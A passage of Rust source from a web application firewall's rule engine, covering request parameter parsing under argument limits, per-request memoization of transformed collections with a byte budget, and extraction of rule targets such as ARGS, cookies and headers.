            "lt" => Some('<'),
            "gt" => Some('>'),
            "amp" => Some('&'),
            "quot" => Some('"'),
            "apos" => Some('\''),
            _ => entity.strip_prefix('#').and_then(|num| {
                let cp = match num.strip_prefix(['x', 'X']) {
                    Some(hex) => u32::from_str_radix(hex, 16).ok(),
                    None => num.parse::<u32>().ok(),
                };
                cp.and_then(char::from_u32)
            }),
        };
        match decoded {
            Some(c) => {
                out.push(c);
                rest = &after[semi + 1..];
            }
            None => {
                // Not a recognised entity — keep the literal `&` and continue.
                out.push('&');
                rest = &after[1..];
            }
        }
    }
    out.push_str(rest);
    out
}

// ---------------------------------------------------------------------------
// Per-evaluate request views
// ---------------------------------------------------------------------------

/// Request parameters as a name list and a value list, in request order.
///
/// Two lists rather than pairs, each behind an `Rc`, so that ARGS and
/// ARGS_NAMES can be handed to the stack as they are. Built from pairs, each
/// target was a copy of every name or every value, kept for the whole call.
///
/// `names` is ARGS_NAMES as rules read it: one name per value, except that a
/// body name several values share — a JSON array's elements, an XML element's
/// text nodes (see [`ArgName`]) — is listed once. Listed per value it was
/// copied per value, the blow-up `ArgName` exists to prevent, and every
/// operator gives the same verdict on the same text. `&ARGS_NAMES` still
/// counts one name per value (`len`).
#[derive(Debug, Default)]
struct Params {
    names: Rc<Vec<String>>,
    values: Rc<Vec<String>>,
    /// `names[name_of[i]]` is the name of `values[i]`. Empty while every value
    /// has a name of its own, `names[i]` — always so for a query string, an
    /// urlencoded form and multipart fields, which pay nothing for it.
    name_of: Vec<usize>,
    /// Bytes charged to the site's `max_inspected_arg_bytes`: every value,
    /// each listed name once, and a multipart file part's name and filename.
    bytes: u64,
}

impl Params {
    /// Collect `pairs` into the two lists one pair at a time. A parser that
    /// collected its pairs first and split them after would hold the pairs and
    /// both lists at once — half again the parse, on a body of tiny fields.
    /// Lazy `pairs` stop being parsed at the first one past `budget`.
    fn from_pairs(
        pairs: impl IntoIterator<Item = (String, String)>,
        budget: ArgBudget,
    ) -> Result<Self, Unlisted> {
        let mut out = ParamsBuilder::new(budget);
        for (name, value) in pairs {
            out.push(name, value)?;
        }
        Ok(out.finish())
    }

    /// How many values, and so how many names as sent.
    fn len(&self) -> usize {
        self.values.len()
    }

    fn is_empty(&self) -> bool {
        self.values.is_empty()
    }

    /// Where in `names` the name of `values[i]` is listed.
    fn listed(&self, i: usize) -> usize {
        self.name_of.get(i).copied().unwrap_or(i)
    }

    /// The name `values[i]` was sent under.
    fn name(&self, i: usize) -> &str {
        &self.names[self.listed(i)]
    }

    /// `(name, value)` pairs, in request order: a shared name once per value.
    fn iter(&self) -> impl Iterator<Item = (&str, &str)> {
        self.values
            .iter()
            .enumerate()
            .map(|(i, value)| (self.name(i), value.as_str()))
    }
}

/// What is left of a site's argument limits ([`InspectionLimits`]) for one
/// parse; `u64::MAX` where the site sets none.
///
/// Charged as the parser goes, so a request past a limit stops being parsed
/// there: the arguments it is refused for are never built, and parsing costs
/// what the limits allow rather than what the client sent.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct ArgBudget {
    args: u64,
    bytes: u64,
}

impl Default for ArgBudget {
    fn default() -> Self {
        Self::UNLIMITED
    }
}

impl ArgBudget {
    const UNLIMITED: Self = Self {
        args: u64::MAX,
        bytes: u64::MAX,
    };

    /// The whole of a request's limits.
    fn of(limits: &InspectionLimits) -> Self {
        let bound = |n: u64| if n == 0 { u64::MAX } else { n };
        Self {
            args: bound(limits.max_args.into()),
            bytes: bound(limits.max_arg_bytes),
        }
    }

    /// Take `args` arguments of `bytes` bytes, or name the limit they pass.
    fn charge(&mut self, args: u64, bytes: u64) -> Result<(), Unlisted> {
        self.args =
            (self.args.checked_sub(args)).ok_or(Unlisted::OverLimit(InspectionLimit::Args))?;
        self.bytes = (self.bytes.checked_sub(bytes))
            .ok_or(Unlisted::OverLimit(InspectionLimit::ArgBytes))?;
        Ok(())
    }

    /// What is left after the query string's `parsed` parameters, which were
    /// charged to a budget of the same limits.
    fn after(self, parsed: &Params) -> Self {
        Self {
            args: self.args.saturating_sub(parsed.len() as u64),
            bytes: self.bytes.saturating_sub(parsed.bytes),
        }
    }
}

/// Builds [`Params`] as a parser finds its pairs, charging each to the budget.
#[derive(Default)]
struct ParamsBuilder {
    names: Vec<String>,
    values: Vec<String>,
    name_of: Vec<usize>,
    /// A shared name's identity ([`name_id`]) → where it is listed. Holds the
    /// name as well: an address identifies a name only while its allocation
    /// lives, and a parser may drop one (an XML element's, at its closing tag)
    /// before a later name takes over the address.
    shared: HashMap<usize, (usize, ArgName)>,
    bytes: u64,
    budget: ArgBudget,
}

impl ParamsBuilder {
    fn new(budget: ArgBudget) -> Self {
        Self {
            budget,
            ..Self::default()
        }
    }

    /// A value with a name of its own.
    fn push(&mut self, name: String, value: String) -> Result<(), Unlisted> {
        self.charge(name.len() + value.len())?;
        self.names.push(name);
        self.file(self.names.len() - 1, value);
        Ok(())
    }

    /// A value under a name other values may share: listed, and its bytes
    /// charged, the first time — it is inspected once.
    fn push_shared(&mut self, name: &ArgName, value: String) -> Result<(), Unlisted> {
        let known = self.shared.get(&name_id(name)).map(|&(at, _)| at);
        self.charge(known.map_or(name.len(), |_| 0) + value.len())?;
        let listed = known.unwrap_or_else(|| {
            let at = self.names.len();
            self.shared.insert(name_id(name), (at, name.clone()));
            self.names.push(name.to_string());
            at
        });
        self.file(listed, value);
        Ok(())
    }

    /// One argument of `bytes` bytes. Also how a multipart part that is not
    /// a parameter is counted — a file part, whose name and filename are
    /// inspected (FILES_NAMES, FILES), or a part with no name — with its
    /// header lines (MULTIPART_PART_HEADERS).
    fn charge(&mut self, bytes: usize) -> Result<(), Unlisted> {
        self.budget.charge(1, bytes as u64)?;
        self.bytes += bytes as u64;
        Ok(())
    }

    /// `bytes` more of an argument charged elsewhere: a multipart field's
    /// header lines.
    fn charge_bytes(&mut self, bytes: usize) -> Result<(), Unlisted> {
        self.budget.charge(0, bytes as u64)?;
        self.bytes += bytes as u64;
        Ok(())
    }

    fn file(&mut self, listed: usize, value: String) {
        let i = self.values.len();
        // Kept only from the first value whose name is not its own.
        if self.name_of.is_empty() && listed != i {
            self.name_of.extend(0..i);
        }
        if !self.name_of.is_empty() {
            self.name_of.push(listed);
        }
        self.values.push(value);
    }

    fn finish(self) -> Params {
        Params {
            names: Rc::new(self.names),
            values: Rc::new(self.values),
            name_of: self.name_of,
            bytes: self.bytes,
        }
    }
}

/// A target and the transform chain applied to it — an empty chain for its
/// untransformed values. What the per-call memo is keyed by.
pub(crate) type MemoKey = (TargetSpec, Vec<Transform>);

/// One collection kept for the rest of an `evaluate` call.
struct MemoEntry {
    values: Rc<Vec<String>>,
    /// What keeping it costs: its size, or 0 when the values are held anyway —
    /// by a parsed view, or by the entry they are shared with.
    bytes: usize,
    /// How many rules of the phase program read it: what keeping it saves.
    uses: u32,
}

/// The request-derived collections rules read, each built at most ONCE per
/// `evaluate` call and shared by every rule that reads it.
///
/// Every rule loading an ARGS-family target used to re-parse the query string
/// and the body — JSON included — and every FILES rule re-split the multipart
/// envelope, so a request was parsed once per such rule (well over a hundred in
/// CRS) instead of once: about half of the evaluation time on a large body.
///
/// Filled lazily, so a view no rule reads is never built. It lives on the stack
/// of one `evaluate` call and never longer, which is what keeps it correct:
/// rules change TX variables, the scores and the verdict, never the request or
/// the response, so a view built from them stays true for the rest of the call.
/// What DOES change mid-call — TX variables, `MATCHED_VAR` — is never memoized;
/// see `memo_policy`.
///
/// Memory: the parsed views hold the request's parameters once — what the old
/// per-rule parse held for the length of one rule — and ARGS, ARGS_NAMES,
/// ARGS_GET and a multipart REQUEST_BODY are those very lists. Everything else
/// kept for the call, a copy no view holds or a transform chain's output, is
/// charged to `memo_budget`. So one call holds at most its parse, that budget
/// and the working set of the rule running — however many rules read the body
/// and whatever the body contains (`tests/evaluate_memory.rs`). The working
/// set is the old one: a chain over a raw body still holds its input and its
/// output while it runs.
#[derive(Default)]
struct RequestViews<'a> {
    content_type: OnceCell<String>,
    host: OnceCell<String>,
    /// Each parsed view of the request's arguments, or why it cannot be listed
    /// — past the site's argument limits, or (a body) too complex to list.
    query: OnceCell<Result<Params, Unlisted>>,
    /// An urlencoded, JSON or XML body's parameters. A multipart body's are in
    /// `multipart`; see `body`.
    body: OnceCell<Result<Params, Unlisted>>,
    multipart: OnceCell<Result<MultipartParts, Unlisted>>,
    /// Whether REQUEST_BODY may read the body whole; see `whole_body`.
    whole_body: OnceCell<Result<(), Unlisted>>,
    cookies: OnceCell<Vec<(String, String)>>,
    /// Collections kept for the call, by target and transform chain. CRS
    /// repeats a handful of pairs across dozens of rules — 103 phase-2 rules
    /// read ARGS through `t:urlDecodeUni` alone — and transforms are pure, so
    /// each such pair is computed once.
    memo: RefCell<HashMap<MemoKey, MemoEntry>>,
    /// Sum of the entries' `bytes`; never more than `memo_budget`.
    memo_bytes: Cell<usize>,
    /// Set when the budget first refuses a collection, so the refusal is
    /// logged once per call rather than once per rule.
    memo_refused: Cell<bool>,
    /// How many rules of this phase program read each key; see `memo_uses`.
    /// `None` outside `evaluate`, where nothing is memoized.
    uses: Option<&'a HashMap<MemoKey, u32>>,
}

impl<'a> RequestViews<'a> {
    /// Views for one run of a phase program whose reads `uses` counts.
    fn new(uses: &'a HashMap<MemoKey, u32>) -> Self {
        Self {
            uses: Some(uses),
            ..Self::default()
        }
    }

    /// Lower-cased `Content-Type`; see `content_type`.
    fn content_type(&self, ctx: &RequestContext) -> &str {
        self.content_type.get_or_init(|| content_type(ctx))
    }

    /// The request's own host; see `request_host`.
    fn host(&self, ctx: &RequestContext) -> &str {
        self.host.get_or_init(|| request_host(ctx))
    }

    /// Decoded query-string parameters, in request order, charged to the
    /// site's argument limits (`ctx.inspection_limits`).
    fn query(&self, ctx: &RequestContext) -> Result<&Params, Unlisted> {
        self.query
            .get_or_init(|| {
                note_view_built(View::Query);
                let budget = ArgBudget::of(&ctx.inspection_limits);
                Params::from_pairs(parse_query_params(ctx.uri.query().unwrap_or("")), budget)
            })
            .as_ref()
            .map_err(|&e| e)
    }

    /// What the site's argument limits leave for the body: the query string
    /// and the body are judged together, as ARGS holds both.
    fn body_budget(&self, ctx: &RequestContext) -> Result<ArgBudget, Unlisted> {
        Ok(ArgBudget::of(&ctx.inspection_limits).after(self.query(ctx)?))
    }

    /// Body parameters, in body order; see `body_args`.
    fn body(&self, ctx: &RequestContext) -> Result<&Params, Unlisted> {
        match body_parser(self.content_type(ctx)) {
            // Non-file form fields feed ARGS exactly like a urlencoded form, so
            // injection delivered through a multipart body is inspected the
            // same way; file parts are surfaced via the FILES* targets instead.
            // Taken from the multipart view, not copied out of it: the copy
            // duplicated every field of the body for the whole call.
            BodyParser::Multipart => Ok(&self.multipart(ctx)?.fields),
            parser => self
                .body
                .get_or_init(|| {
                    note_view_built(View::Body);
                    body_args(ctx, parser, self.body_budget(ctx)?)
                })
                .as_ref()
                .map_err(|&e| e),
        }
    }

    /// Whether REQUEST_BODY may read a (non-multipart) body whole within the
    /// site's argument limits. Before, nothing bounded it but `max_body_size`:
    /// 10 MiB of octet-stream ran to the time budget, as did 10 MiB of XML
    /// comment under every argument limit.
    ///
    /// A body no parser takes apart — text/plain, octet-stream,
    /// multipart/related, no Content-Type — reaches the rules only this way,
    /// so it is one argument of its whole length as the rules read it (see
    /// `lossy_len`), after the query string's: as the malformed-JSON fallback
    /// in `body_args` is.
    ///
    /// A body a parser takes apart was charged as its arguments, and is not
    /// charged again. That parse must fit, so a body past the limits is
    /// refused before it is read whole rather than after; and read whole it
    /// may be at most [`WHOLE_BODY_FACTOR`] times the byte limit.
    fn whole_body(&self, ctx: &RequestContext) -> Result<(), Unlisted> {
        *self.whole_body.get_or_init(|| {
            let Some(body) = ctx.request_body.as_deref().filter(|b| !b.is_empty()) else {
                return Ok(());
            };
            let len = lossy_len(body) as u64;
            match body_parser(self.content_type(ctx)) {
                BodyParser::None => self.body_budget(ctx)?.charge(1, len),
                _ => {
                    self.body(ctx)?;
                    let limit = ctx.inspection_limits.max_arg_bytes;
                    if limit > 0 && len > limit.saturating_mul(WHOLE_BODY_FACTOR) {
                        return Err(Unlisted::WholeBodyOverLimit(len));
                    }
                    Ok(())
                }
            }
        })
    }

    /// The parsed `multipart/form-data` body; empty for any other body.
    fn multipart(&self, ctx: &RequestContext) -> Result<&MultipartParts, Unlisted> {
        self.multipart
            .get_or_init(|| {
                note_view_built(View::Multipart);
                multipart_parts(ctx, self.body_budget(ctx)?)
            })
            .as_ref()
            .map_err(|&e| e)
    }

    /// `(name, value)` pairs of every `Cookie` field. This read the first
    /// field only, and nothing when it held a byte >= 0x80: HTTP/2 and HTTP/3
    /// send a field per cookie, so every cookie after the first was unseen by
    /// every cookie rule (live on .71: 9 CRS matches became 1).
    fn cookies(&self, ctx: &RequestContext) -> &[(String, String)] {
        self.cookies.get_or_init(|| {
            note_view_built(View::Cookies);
            ctx.request_headers
                .get_all("cookie")
                .iter()
                .flat_map(|v| parse_cookies(&header_text(v)))
                .collect()
        })
    }

    /// The values of `spec` that a parsed view already holds, handed out
    /// without a copy.
    fn shared(
        &self,
        spec: &TargetSpec,
        ctx: &RequestContext,
    ) -> Result<Option<Rc<Vec<String>>>, Unlisted> {
        let side = |params: &Params, names: bool| {
            Rc::clone(if names { &params.names } else { &params.values })
        };
        Ok(match spec {
            TargetSpec::ArgsGet => Some(side(self.query(ctx)?, false)),
            TargetSpec::ArgsGetNames => Some(side(self.query(ctx)?, true)),
            // ARGS is the query parameters followed by the body ones. With one
            // side empty — a GET, or a POST without a query string — it IS the
            // other side; only a request carrying both needs a joined copy.
            TargetSpec::Args | TargetSpec::ArgsNames => {
                let names = matches!(spec, TargetSpec::ArgsNames);
                let (query, body) = (self.query(ctx)?, self.body(ctx)?);
                if body.is_empty() {
                    Some(side(query, names))
                } else if query.is_empty() {
                    Some(side(body, names))
                } else {
                    None
                }
            }
            // The part values, not the envelope; see `extract_target`.
            TargetSpec::RequestBody
                if self.content_type(ctx).starts_with("multipart/form-data") =>
            {
                Some(Rc::clone(&self.multipart(ctx)?.fields.values))
            }
            _ => None,
        })
    }

    /// The values `spec` names: shared from a view, taken from the memo, or
    /// extracted afresh. Fails only for a body that cannot be listed within
    /// budget ([`Unlisted`]); the caller refuses the request.
    fn load(
        &self,
        spec: &TargetSpec,
        ctx: &RequestContext,
        last_matched: Option<&str>,
    ) -> Result<Rc<Vec<String>>, Unlisted> {
        Ok(self.load_held(spec, ctx, last_matched)?.0)
    }

    /// `load`, and whether the values are held for the rest of the call
    /// anyway — by a view or by the memo — so that sharing them costs nothing.
    fn load_held(
        &self,
        spec: &TargetSpec,
        ctx: &RequestContext,
        last_matched: Option<&str>,
    ) -> Result<(Rc<Vec<String>>, bool), Unlisted> {
        if let Some(values) = self.shared(spec, ctx)? {
            return Ok((values, true));
        }
        let policy = memo_policy(spec);
        if policy == Memo::Never {
            return Ok((
                Rc::new(extract_target(spec, ctx, self, last_matched)?),
                false,
            ));
        }
        let key = (spec.clone(), Vec::new());
        if let Some(entry) = self.memo.borrow().get(&key) {
            return Ok((Rc::clone(&entry.values), true));
        }
        let values = Rc::new(extract_target(spec, ctx, self, last_matched)?);
        let held = policy == Memo::All && self.retain(key, &values, held_size(&values), ctx);
        Ok((values, held))
    }

    /// How many values `spec` names, without building a joined ARGS for it.
    /// `&ARGS_NAMES` counts every name as sent, a shared one once per value.
    fn count(
        &self,
        spec: &TargetSpec,
        ctx: &RequestContext,
        last_matched: Option<&str>,
    ) -> Result<usize, Unlisted> {
        Ok(match spec {
            TargetSpec::Args | TargetSpec::ArgsNames => {
                self.query(ctx)?.len() + self.body(ctx)?.len()
            }
            other => self.load(other, ctx, last_matched)?.len(),
        })
    }

    /// The values of a memoizable `spec` after `transforms`: computed once per
    /// call for a (target, chain) pair that several rules read, while the
    /// budget allows, and once per rule otherwise.
    fn load_transformed(
        &self,
        spec: &TargetSpec,
        transforms: &[Transform],
        ctx: &RequestContext,
    ) -> Result<Rc<Vec<String>>, Unlisted> {
        debug_assert!(memo_policy(spec) != Memo::Never);
        if transforms.is_empty() {
            return self.load(spec, ctx, None);
        }
        let key = (spec.clone(), transforms.to_vec());
        if let Some(entry) = self.memo.borrow().get(&key) {
            return Ok(Rc::clone(&entry.values));
        }
        let (base, held) = self.load_held(spec, ctx, None)?;
        note_view_built(View::Transform);
        if let Some(out) = transform_values(&base, transforms) {
            let out = Rc::new(out);
            self.retain(key, &out, held_size(&out), ctx);
            return Ok(out);
        }
        // On benign text most chains change nothing, and their output is the
        // untransformed values. Held by a view or the memo already, those cost
        // nothing to share. Otherwise — a raw body, copied per read — they are
        // kept once, under the untransformed key, for every chain that leaves
        // them as they are.
        if held || self.retain((spec.clone(), Vec::new()), &base, held_size(&base), ctx) {
            self.retain(key, &base, 0, ctx);
        }
        Ok(base)
    }

    /// Keep `values` under `key` for the rest of the call if that pays and the
    /// budget allows; `bytes` is what keeping them adds. Returns whether they
    /// were kept.
    ///
    /// A key only one rule reads is never kept: it would spend budget and save
    /// nothing. When the budget is full, copies that fewer rules read are
    /// dropped to make room, so the chains CRS repeats most keep theirs
    /// whichever rule happened to ask first.
    fn retain(
        &self,
        key: MemoKey,
        values: &Rc<Vec<String>>,
        bytes: usize,
        ctx: &RequestContext,
    ) -> bool {
        let uses = self.uses.and_then(|u| u.get(&key)).copied().unwrap_or(0);
        if uses < 2 {
            return false;
        }
        let mut memo = self.memo.borrow_mut();
        if bytes > 0 {
            let budget = memo_budget(ctx);
            let held = self.memo_bytes.get();
            let over = (held + bytes).saturating_sub(budget);
            if over > 0 && !self.evict(&mut memo, over, uses) {
                // Past the budget the VM costs what it did without the memo:
                // one extraction and one chain per rule. Logged once per call
                // so that a slow request can be told apart from a slow rule.
                if !self.memo_refused.replace(true) {
                    debug!(
                        rule_target = %key.0.label(),
                        chain_len = key.1.len(),
                        bytes,
                        memo_bytes = held,
                        budget,
                        "rule VM: per-request memo budget reached; collections past it \
                         are re-extracted and re-transformed by every rule that reads them"
                    );
                }
                return false;
            }
            self.memo_bytes.set(self.memo_bytes.get() + bytes);
        }
        let replaced = memo.insert(
            key,
            MemoEntry {
                values: Rc::clone(values),
                bytes,
                uses,
            },
        );
        // Callers look a key up before computing it, so nothing is replaced;
        // if something were, its bytes must not stay counted.
        if let Some(old) = replaced {
            self.memo_bytes.set(self.memo_bytes.get() - old.bytes);
        }
        true
    }

    /// Drop kept copies that fewer than `uses` rules read, fewest first, until
    /// `needed` bytes are free. Drops nothing when that cannot free enough.
    fn evict(&self, memo: &mut HashMap<MemoKey, MemoEntry>, needed: usize, uses: u32) -> bool {
        let mut victims: Vec<(u32, usize, MemoKey)> = memo
            .iter()
            .filter(|(_, e)| e.bytes > 0 && e.uses < uses)
            .map(|(key, e)| (e.uses, e.bytes, key.clone()))
            .collect();
        if victims.iter().map(|&(_, bytes, _)| bytes).sum::<usize>() < needed {
            return false;
        }
        victims.sort_unstable_by_key(|&(uses, _, _)| uses);
        let mut freed = 0;
        for (_, bytes, key) in victims {
            if freed >= needed {
                break;
            }
            if let Some(gone) = memo.remove(&key) {
                // Entries sharing its values held nothing of their own, and
                // would keep them alive uncounted: they go with it.
                memo.retain(|_, e| !Rc::ptr_eq(&e.values, &gone.values));
                freed += bytes;
            }
        }
        self.memo_bytes.set(self.memo_bytes.get() - freed);
        true
    }
}

/// `values` after `transforms`, or `None` when the chain changes none of them.
///
/// The copy starts at the first value the chain changes. On benign text most
/// chains change nothing, and transforming into a full copy only to compare it
/// with the original held a second copy of every argument for each chain.
fn transform_values(values: &[String], transforms: &[Transform]) -> Option<Vec<String>> {
    let mut out: Option<Vec<String>> = None;
    for (i, value) in values.iter().enumerate() {
        let transformed = apply_transforms(value.clone(), transforms);
        match out.as_mut() {
            Some(out) => out.push(transformed),
            None if transformed != *value => {
                let mut changed = Vec::with_capacity(values.len());
                changed.extend_from_slice(&values[..i]);
                changed.push(transformed);
                out = Some(changed);
            }
            None => {}
        }
    }
    out
}

/// What keeping `values` for the call costs. Each value's own header counts
/// too: a body of a million one-byte fields is mostly headers, and judging it
/// by its text would let the copies dwarf the budget.
fn held_size(values: &[String]) -> usize {
    values
        .iter()
        .map(|s| s.len() + std::mem::size_of::<String>())
        .sum()
}

/// How many bytes the memo may keep in one `evaluate` call — copies that no
/// parsed view holds, and transform chains' output: twice the bodies under
/// inspection, with a 1 MiB floor so that small requests always get the full
/// benefit. Without it, a body built so that every chain rewrites every value
/// would hold one copy per distinct chain — dozens of times its own size —
/// where the memo-less VM held one at a time. Twice, because one rewritten copy
/// of every argument, value headers included, can outgrow the body it came
/// from, and the most-read chain should still fit.
fn memo_budget(ctx: &RequestContext) -> usize {
    const FLOOR: usize = 1 << 20;
    let len = |b: &Option<bytes::Bytes>| b.as_ref().map_or(0, |b| b.len());
    let bodies = len(&ctx.request_body).saturating_add(len(&ctx.response_body));
    bodies.saturating_mul(2).max(FLOOR)
}

/// What of a target's values may be kept for the rest of an `evaluate` call.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
enum Memo {
    /// Nothing: VM state, or one short value whose lookup would cost what
    /// extracting it does.
    Never,
    /// Its transform chains' output, not its own values: a raw body, which is
    /// one copy of bytes the context holds — cheap to make again per rule, and
    /// a whole body to keep — while a chain over it is a pass over every byte.
    Chains,
    /// Its values and its chains' output: a collection built from many values.
    All,
}

/// Which of `spec`'s values may be memoized: only collections derived from the
/// request or response alone, which no rule modifies.
///
/// Exhaustive on purpose, so a new target has to be classified here. Memoizing
/// one that reads VM state would be silently wrong: a TX variable written by a
/// `setvar` must be visible to the very next rule.
fn memo_policy(spec: &TargetSpec) -> Memo {
    match spec {
        TargetSpec::Args
        | TargetSpec::ArgsNames
        | TargetSpec::ArgsGet
        | TargetSpec::ArgsGetNames
        | TargetSpec::ArgsCombinedSize
        | TargetSpec::RequestHeadersAll
        | TargetSpec::RequestHeadersNames
        | TargetSpec::RequestCookiesAll
        | TargetSpec::RequestCookiesNames
        | TargetSpec::RequestCookie(_)
        | TargetSpec::MultipartPartHeadersAll
        | TargetSpec::MultipartPartHeader(_)
        | TargetSpec::Files
        | TargetSpec::FilesNames
        | TargetSpec::FilesCombinedSize
        | TargetSpec::ResponseHeadersAll => Memo::All,
        TargetSpec::RequestBody | TargetSpec::ResponseBody => Memo::Chains,
        TargetSpec::RequestUri
        | TargetSpec::RequestFilename
        | TargetSpec::RequestMethod
        | TargetSpec::RequestLine
        | TargetSpec::RequestProtocol
        | TargetSpec::ReqbodyProcessor
        | TargetSpec::RequestHeader(_)
        | TargetSpec::QueryString
        | TargetSpec::ResponseHeader(_)
        | TargetSpec::RemoteAddr
        | TargetSpec::Geo => Memo::Never,
        // Counted from the inner target, which is memoized itself when it can be.
        TargetSpec::CountOf(_) => Memo::Never,
        // VM state: written by `setvar` and by the previous chain link.
        TargetSpec::TxVar(_) | TargetSpec::MatchedVar => Memo::Never,
        // As its collection: every rule with the same exclusions shares it.
        TargetSpec::Except { base, .. } => memo_policy(base),
    }
}

/// Whether a member called `name` is one `keys` leaves out.
fn excluded(keys: &[ExclusionKey], name: &str) -> bool {
    keys.iter().any(|key| match key {
        ExclusionKey::Name(n) => n.eq_ignore_ascii_case(name),
        ExclusionKey::Pattern(p) => key_pattern_finds(p, name),
    })
}

/// Does `/pattern/` find `name`, case-insensitively? CRS's own patterns
/// (`__utm`, `_pk_ref`) are plain text and are searched for as such; anything
/// else is compiled once per thread. A pattern that does not compile excludes
/// nothing, so the member stays inspected.
fn key_pattern_finds(pattern: &str, name: &str) -> bool {
    const META: &[char] = &[
        '\\', '.', '+', '*', '?', '(', ')', '|', '[', ']', '{', '}', '^', '$',
    ];
    if !pattern.contains(META) {
        return name
            .to_ascii_lowercase()
            .contains(&pattern.to_ascii_lowercase());
    }
    thread_local! {
        static COMPILED: RefCell<HashMap<String, Option<regex::Regex>>> =
            RefCell::new(HashMap::new());
    }
    COMPILED.with(|c| {
        c.borrow_mut()
            .entry(pattern.to_owned())
            .or_insert_with(|| {
                regex::RegexBuilder::new(pattern)
                    .case_insensitive(true)
                    .size_limit(1 << 20)
                    .build()
                    .ok()
            })
            .as_ref()
            .is_some_and(|rx| rx.is_match(name))
    })
}

/// How many rules of `program` read each memoizable target — untransformed,
/// and through each transform chain — which is what keeping it for a call
/// saves. Computed once per compiled program, so `evaluate` only looks it up.
///
/// Mirrors `evaluate`: the chain is the `ApplyTransforms` the compiler emits
/// right after a `LoadTarget`, and a multiMatch chain is never memoized. Every
/// read needs the untransformed values, if only to transform them, so each one
/// counts for them as well.
pub(crate) fn memo_uses(program: &[Instruction]) -> HashMap<MemoKey, u32> {
    let mut uses: HashMap<MemoKey, u32> = HashMap::new();
    for (ip, instr) in program.iter().enumerate() {
        let Instruction::LoadTarget(spec) = instr else {
            continue;
        };
        if let TargetSpec::CountOf(inner) = spec {
            if memo_policy(inner) != Memo::Never {
                *uses
                    .entry((inner.as_ref().clone(), Vec::new()))
                    .or_default() += 1;
            }
            continue;
        }
        if memo_policy(spec) == Memo::Never {
            continue;
        }
        *uses.entry((spec.clone(), Vec::new())).or_default() += 1;
        if let Some(Instruction::ApplyTransforms {
            transforms,
            multi_match: false,
        }) = program.get(ip + 1)
        {
            if !transforms.is_empty() {
                *uses.entry((spec.clone(), transforms.clone())).or_default() += 1;
            }
        }
    }
    uses
}

/// A request view, for counting how often each is built.
#[derive(Clone, Copy)]
enum View {
    Query,
    Body,
    Multipart,
    Cookies,
    /// A transform chain run over a memoized target.
    Transform,
}

#[cfg(test)]
thread_local! {
    /// Builds of each view on this thread. Lets a test prove a view is parsed
    /// at most once per `evaluate` call; per-thread so parallel tests do not
    /// see each other's counts.
    static VIEW_BUILDS: Cell<[usize; 5]> = const { Cell::new([0; 5]) };
}

#[cfg(test)]
fn note_view_built(view: View) {
    VIEW_BUILDS.with(|builds| {
        let mut n = builds.get();
        n[view as usize] += 1;
        builds.set(n);
    });
}

#[cfg(not(test))]
fn note_view_built(_: View) {}

/// `last_matched` is what the PREVIOUS condition in the current chain matched.
/// It is threaded in rather than read from `ctx` because it is VM state that
/// lives for one rule: `TargetSpec::MatchedVar` is the only consumer, and
/// resolving it anywhere else would silently yield nothing.
///
/// Reads the parsed collections from `views` — see `RequestViews`. Fails only
/// for a body that cannot be listed within budget ([`Unlisted`]); the
/// caller refuses the request.
fn extract_target(
    spec: &TargetSpec,
    ctx: &RequestContext,
    views: &RequestViews,
    last_matched: Option<&str>,
) -> Result<Vec<String>, Unlisted> {
    Ok(match spec {
        // Outside a chain nothing has matched yet, and an empty list is the
        // honest answer: the condition simply does not match.
        TargetSpec::MatchedVar => last_matched.map(|v| vec![v.to_owned()]).unwrap_or_default(),
        // The collection's values in the order `base` lists them, less the
        // members the rule excludes.
        TargetSpec::Except { base, keys } => {
            let keep =
                |(name, value): (&str, &str)| (!excluded(keys, name)).then(|| value.to_owned());
            match base.as_ref() {
                TargetSpec::Args => {
                    let (query, body) = (views.query(ctx)?, views.body(ctx)?);
                    query.iter().chain(body.iter()).filter_map(keep).collect()
                }
                TargetSpec::ArgsGet => views.query(ctx)?.iter().filter_map(keep).collect(),
                TargetSpec::ArgsNames => {
                    let (query, body) = (views.query(ctx)?, views.body(ctx)?);
                    query
                        .names
                        .iter()
                        .chain(body.names.iter())
                        .filter(|n| !excluded(keys, n))
                        .cloned()
                        .collect()
                }
                TargetSpec::ArgsGetNames => views
                    .query(ctx)?
                    .names
                    .iter()
                    .filter(|n| !excluded(keys, n))
                    .cloned()
                    .collect(),
                TargetSpec::RequestCookiesAll => views
                    .cookies(ctx)
                    .iter()
                    .filter_map(|(k, v)| keep((k, v)))
                    .collect(),
                TargetSpec::RequestCookiesNames => views
                    .cookies(ctx)
                    .iter()
                    .filter(|(k, _)| !excluded(keys, k))
                    .map(|(k, _)| k.clone())
                    .collect(),
                TargetSpec::RequestHeadersAll => ctx
                    .request_headers
                    .iter()
                    .filter(|(name, _)| !excluded(keys, name.as_str()))
                    .map(|(_, v)| header_text(v).into_owned())
                    .collect(),
                TargetSpec::RequestHeadersNames => ctx
                    .request_headers
                    .keys()
                    .filter(|name| !excluded(keys, name.as_str()))
                    .map(|name| name.as_str().to_owned())
                    .collect(),
                // `TargetSpec::excluding` wraps only the collections above.
                other => extract_target(other, ctx, views, last_matched)?,
            }
        }
        // ARGS also includes urlencoded / JSON POST body parameters, after the
        // query-string ones. Built only for a request carrying both; with one
        // side empty `RequestViews::shared` hands out the other side as it is.
        TargetSpec::Args => {
            let (query, body) = (views.query(ctx)?, views.body(ctx)?);
            query
                .values
                .iter()
                .chain(body.values.iter())
                .cloned()
                .collect()
        }
        TargetSpec::ArgsNames => {
            // A body name shared by several values is listed once; see
            // `Params`. `&ARGS_NAMES` still counts each one (see `count`).
            let (query, body) = (views.query(ctx)?, views.body(ctx)?);
            query
                .names
                .iter()
                .chain(body.names.iter())
                .cloned()
                .collect()
        }
        TargetSpec::RequestUri => vec![ctx.uri.to_string()],
        TargetSpec::RequestFilename => vec![ctx.uri.path().to_owned()],
        TargetSpec::RequestMethod => vec![ctx.method.as_str().to_owned()],
        TargetSpec::RequestLine => {
            vec![format!("{} {} {:?}", ctx.method, ctx.uri, ctx.http_version)]
        }
        // ModSecurity spells the version `HTTP/1.1`, `HTTP/2.0`, and CRS
        // compares against that exact text: 920180 uses
        // `!@within HTTP/2 HTTP/2.0 HTTP/3 HTTP/3.0` and 920430 checks
        // `%{tx.allowed_http_versions}`. `Version`'s Debug form is already that
        // spelling, which is why `RequestLine` above uses it too.
        TargetSpec::RequestProtocol => vec![format!("{:?}", ctx.http_version)],
        // Which parser handled the body, named as ModSecurity names it.
        //
        // Derived from Content-Type rather than stored on the context, because
        // that is exactly how the choice is made in the first place — see
